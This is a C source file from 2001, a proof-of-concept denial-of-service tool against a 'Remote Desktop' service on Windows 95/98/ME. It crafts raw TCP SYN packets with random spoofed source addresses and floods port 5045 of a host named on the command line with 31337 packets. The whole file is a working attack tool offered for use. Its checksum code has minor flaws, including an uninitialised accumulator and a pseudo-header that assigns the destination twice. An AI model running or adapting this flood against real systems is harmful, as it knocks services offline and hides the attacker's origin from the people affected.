/*
 * Remote Desktop DoS for LiNUX
 * Tahum - Tahum@acmemail.net - 16/5/2001
 *
 * This code is the proof of concept of the advisory at Bugtraq of altomo.
 * with honoriak's motor! ;-)
 *
 * - Affected Systems: Windows 95
 *                     Windows 98
 *                     Windows Millenium
 *
 * Acknowledgements to ulandron, Trycky, FraMe, dAb... and all who
 * perseveres me.
 *
 * Paraphrasing honoriak: "DoSs are lame, i know, but boredom is ugly."
 *
 * Use this code at your own responsability.
 *
 * (C) 2001, HeliSec.
 *
 */

 #include <stdio.h>
 #include <string.h>
 #include <unistd.h>
 #include <time.h>  
 #include <sys/types.h>
 #include <sys/stat.h> 
 #include <sys/socket.h>
 #include <netdb.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <netinet/ip.h>
 
 #define __FAVOR_BSD
 #include <netinet/tcp.h>

 #define PORT 5045

 struct pseudohdr {
         struct in_addr saddr;
         struct in_addr daddr;
         u_char zero;
         u_char protocol;
         u_short len;
         struct tcphdr tcpheader;
     }pseudoh;


 unsigned long
 resolve(name)

  char *name;

 {

   struct in_addr h2;
   struct hostent *hname;

   if (!(hname = gethostbyname(name))) return(0);
   memcpy((char *)&h2.s_addr, hname->h_addr, hname->h_length);
   return(h2.s_addr);
 }

 u_short checksum (data, length)
 u_short *data;
 u_short length;

 {

  register long value;
  u_short i;

        for (i = 0; i < (length >> 1); i++)
          value += data[i];

        if ((length & 1) == 1)
          value += (data[i] << 8);

        value = (value & 65535) + (value >> 16);

        return (~value);
 }


 void
 packet(vic, socket) 
 	struct sockaddr_in *vic;
 	int socket;
 {
 
  int count;
  char buffer[40];

 struct ip *ipheader = (struct ip *)buffer;
 struct tcphdr *tcpheader = (struct tcphdr *)(buffer + sizeof(struct ip));
 
 bzero (&buffer, (sizeof(struct ip) + sizeof(struct tcphdr)) );

 	ipheader->ip_v = IPVERSION;
 	ipheader->ip_hl = 5;
 	ipheader->ip_tos = htons(0);
 	ipheader->ip_len = htons(sizeof(buffer));
 	ipheader->ip_id = rand() % 0xffff;
 	ipheader->ip_off = htons(0);
 	ipheader->ip_ttl = 0xff;  /* 255 hex */
 	ipheader->ip_p = IPPROTO_TCP;
 	ipheader->ip_src.s_addr = rand();
 	ipheader->ip_dst.s_addr = vic->sin_addr.s_addr;
 	ipheader->ip_sum = 0;

        tcpheader->th_sport = (unsigned short) (rand() % 0xffff);
 	tcpheader->th_dport = vic->sin_port;
 	tcpheader->th_seq = htonl(0xF1C);
 	tcpheader->th_ack = 0;
 	tcpheader->th_off = 5;
 	tcpheader->th_flags = TH_SYN;
 	tcpheader->th_win = 4096;
 	tcpheader->th_sum = 0;   

 bzero (&pseudoh, 12 + sizeof(struct tcphdr));  
 pseudoh.daddr.s_addr = ipheader->ip_src.s_addr;
 pseudoh.daddr.s_addr = ipheader->ip_dst.s_addr;
 pseudoh.protocol = 6;
 pseudoh.len = htons (sizeof(struct tcphdr));
 memcpy((char *)&pseudoh.tcpheader, (char *)tcpheader, sizeof (struct tcphdr));
 tcpheader->th_sum = checksum((u_short *)&pseudoh, 12 + sizeof (struct tcphdr));
             
 for (count=0;count<31337; count++) {
   if ( (sendto(socket, buffer, (sizeof(struct iphdr) + sizeof(struct tcphdr)), 
  	        0, (struct sockaddr *)vic, sizeof(struct sockaddr_in))) < 0) {
 	          fprintf(stderr, " ** Error sending packets **\n"); 
                  exit(-1);
           }
     }

 close (socket);
  }

 void
 usage(program) 

  char *program;
 {
	fprintf(stderr, "\n ** Remote Desktop <= 3.0 DoS **");
	fprintf(stderr, "\n By Tahum - Tahum@acmemail.net - 16/5/2001");
	fprintf(stderr, "\n (C) 2001, HeliSec.");
        fprintf(stderr, "\n Usage: %s host\n", program);
	exit(0);
 }

 main(argc, argv)
 int argc;
 char **argv;
  
 {
  struct sockaddr_in h;
  int sock, uno = 1;
  
  if (argc < 2)
  {
   usage(argv[0]);
  }

  bzero(&h, sizeof(h));
  h.sin_family = AF_INET;
  h.sin_port = htons(PORT);

 if ((inet_pton(AF_INET, argv[1], &h.sin_addr)) <= 0)
   {
     h.sin_addr.s_addr = resolve(argv[1]);
   }

 if (!h.sin_addr.s_addr)
   {
    fprintf(stderr, "Error resolving host\n");
    exit(-1);
   }

 if ((sock = socket(AF_INET, SOCK_RAW, 255)) < 0)
    {
     fprintf(stderr, " ** Error creating raw socket, root privileges are necessary\n");
     exit (-1);
    }

 setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &uno, sizeof(uno));

 packet(&h, sock);
 fprintf(stderr, "\nAll done. DoS completed.\n");
 exit(0);

 }
